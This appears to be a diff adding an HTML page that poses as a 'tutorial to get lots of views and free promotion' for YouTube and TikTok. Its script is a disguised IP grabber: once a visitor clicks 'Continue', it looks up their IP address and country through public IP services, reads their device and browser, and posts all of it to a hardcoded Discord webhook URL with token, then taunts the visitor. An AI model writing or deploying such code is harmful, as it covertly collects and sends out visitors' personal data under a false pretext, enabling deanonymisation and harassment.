@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tutorial by Rusk</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f5f5f5;
+            transition: all 0.5s ease;
+        }
+
+        /* Initial screen */
+        .initial-screen {
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .initial-container {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .initial-title {
+            font-size: 42px;
+            color: #1a202c;
+            margin-bottom: 20px;
+            font-weight: 800;
+        }
+
+        .initial-subtitle {
+            font-size: 20px;
+            color: #718096;
+            margin-bottom: 50px;
+        }
+
+        .initial-button {
+            display: inline-block;
+            padding: 18px 50px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .initial-button:hover {
+            background: #5568d3;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .credit {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #a0aec0;
+        }
+
+        /* Main content screen */
+        .main-screen {
+            display: none;
+            background: white;
+            min-height: 100vh;
+            padding: 60px 20px;
+        }
+
+        .main-container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .main-title {
+            font-size: 42px;
+            color: #1a202c;
+            margin-bottom: 12px;
+            font-weight: 800;
+        }
+
+        .main-subtitle {
+            color: #718096;
+            margin-bottom: 60px;
+            font-size: 20px;
+        }
+
+        .loading-container {
+            text-align: center;
+            padding: 80px 20px;
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #edf2f7;
+            border-top: 5px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 22px;
+            color: #667eea;
+            font-weight: 600;
+        }
+
+        .info-grid {
+            display: none;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-bottom: 50px;
+        }
+
+        .info-grid.loaded {
+            display: grid;
+        }
+
+        .info-card {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            border: 2px solid #e2e8f0;
+            transition: all 0.3s;
+            opacity: 0;
+            animation: fadeInUp 0.6s forwards;
+        }
+
+        .info-card:nth-child(1) { animation-delay: 0.1s; }
+        .info-card:nth-child(2) { animation-delay: 0.2s; }
+        .info-card:nth-child(3) { animation-delay: 0.3s; }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .info-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 24px rgba(102, 126, 234, 0.15);
+            border-color: #667eea;
+        }
+
+        .info-label {
+            font-size: 14px;
+            text-transform: uppercase;
+            color: #a0aec0;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            margin-bottom: 15px;
+        }
+
+        .info-value {
+            font-size: 28px;
+            color: #667eea;
+            font-weight: 700;
+            word-break: break-word;
+            font-family: 'Courier New', monospace;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 30px;
+            background: #f7fafc;
+            border-radius: 16px;
+            color: #718096;
+            font-size: 15px;
+            display: none;
+            border: 2px solid #e2e8f0;
+        }
+
+        .footer.show {
+            display: block;
+            animation: fadeIn 0.5s forwards;
+            animation-delay: 0.5s;
+            opacity: 0;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .footer strong {
+            color: #667eea;
+            font-weight: 700;
+        }
+
+        @media (max-width: 768px) {
+            .main-container, .initial-container {
+                padding: 20px;
+            }
+
+            .main-title, .initial-title {
+                font-size: 32px;
+            }
+
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .info-value {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Initial Screen -->
+    <div class="initial-screen" id="initialScreen">
+        <div class="initial-container">
+            <h1 class="initial-title">Do You Want to Continue?</h1>
+            <p class="initial-subtitle">Click below to proceed</p>
+            <button class="initial-button" onclick="revealMain()">Continue</button>
+            <div class="credit">this is a tutorial and betting site for yt and tt</div>
+        </div>
+    </div>
+
+    <!-- Main Content Screen -->
+    <div class="main-screen" id="mainScreen">
+        <div class="main-container">
+            <h1 class="main-title">Tutorial to Get Lots of Views and Free Promotion</h1>
+            <p class="main-subtitle">By Rusk</p>
+            
+            <div class="loading-container" id="loadingContainer">
+                <div class="loading-spinner"></div>
+                <div class="loading-text">Loading...</div>
+            </div>
+
+            <div class="info-grid" id="infoGrid">
+                <div class="info-card">
+                    <div class="info-label">📍 YOUR IP ADDRESS</div>
+                    <div class="info-value" id="ip"></div>
+                </div>
+
+                <div class="info-card">
+                    <div class="info-label">🌍 YOUR COUNTRY</div>
+                    <div class="info-value" id="country"></div>
+                </div>
+
+                <div class="info-card">
+                    <div class="info-label">💻 YOUR DEVICE</div>
+                    <div class="info-value" id="device"></div>
+                </div>
+            </div>
+
+            <div class="footer" id="footer">
+                <strong>hahahahahaha</strong>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = '';
+            let browser = '';
+            
+            // Detect device
+            if (/mobile/i.test(ua)) {
+                if (/iPhone/i.test(ua)) device = 'iPhone';
+                else if (/iPad/i.test(ua)) device = 'iPad';
+                else if (/Android/i.test(ua)) device = 'Android';
+                else device = 'Mobile';
+            } else {
+                if (/Windows/i.test(ua)) device = 'Windows';
+                else if (/Mac/i.test(ua)) device = 'Mac';
+                else if (/Linux/i.test(ua)) device = 'Linux';
+                else device = 'Desktop';
+            }
+
+            // Detect browser
+            if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) browser = 'Chrome';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Edge/i.test(ua)) browser = 'Edge';
+            else browser = 'Browser';
+            
+            return `${device} • ${browser}`;
+        }
+
+        async function revealMain() {
+            document.getElementById('initialScreen').style.display = 'none';
+            document.getElementById('mainScreen').style.display = 'block';
+
+            // Simulate loading for 2 seconds, then show all data at once
+            setTimeout(async () => {
+                const deviceInfo = getDeviceInfo();
+                let ipInfo = { ip: 'Unavailable', country: 'Unavailable' };
+
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    
+                    if (data.ip) {
+                        ipInfo = {
+                            ip: data.ip,
+                            country: data.country_name || 'Unknown'
+                        };
+                    }
+                } catch (error) {
+                    try {
+                        const response = await fetch('https://api.ipify.org?format=json');
+                        const data = await response.json();
+                        ipInfo.ip = data.ip;
+                        ipInfo.country = 'Unknown';
+                    } catch (finalError) {
+                        // Keep default unavailable values
+                    }
+                }
+
+                // Send to Discord webhook
+                const webhookURL = 'https://discord.com/api/webhooks/1441380609963458581/20_4hgmAP2PVnMSn7J57F5UI5zyoAauVoQisrnanKPq1JlMI24-oMDy5gyWX9XSlIkCJ';
+                
+                try {
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: '🎯 New Visitor Info',
+                                color: 6750234, // Purple color
+                                fields: [
+                                    {
+                                        name: '📍 IP Address',
+                                        value: ipInfo.ip,
+                                        inline: true
+                                    },
+                                    {
+                                        name: '🌍 Country',
+                                        value: ipInfo.country,
+                                        inline: true
+                                    },
+                                    {
+                                        name: '💻 Device',
+                                        value: deviceInfo,
+                                        inline: false
+                                    }
+                                ],
+                                timestamp: new Date().toISOString(),
+                                footer: {
+                                    text: 'Tutorial by Rusk'
+                                }
+                            }]
+                        })
+                    });
+                } catch (webhookError) {
+                    console.log('Webhook failed:', webhookError);
+                }
+
+                // Hide loading and show all data at once
+                document.getElementById('loadingContainer').style.display = 'none';
+                document.getElementById('ip').textContent = ipInfo.ip;
+                document.getElementById('country').textContent = ipInfo.country;
+                document.getElementById('device').textContent = deviceInfo;
+                document.getElementById('infoGrid').classList.add('loaded');
+                document.getElementById('footer').classList.add('show');
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
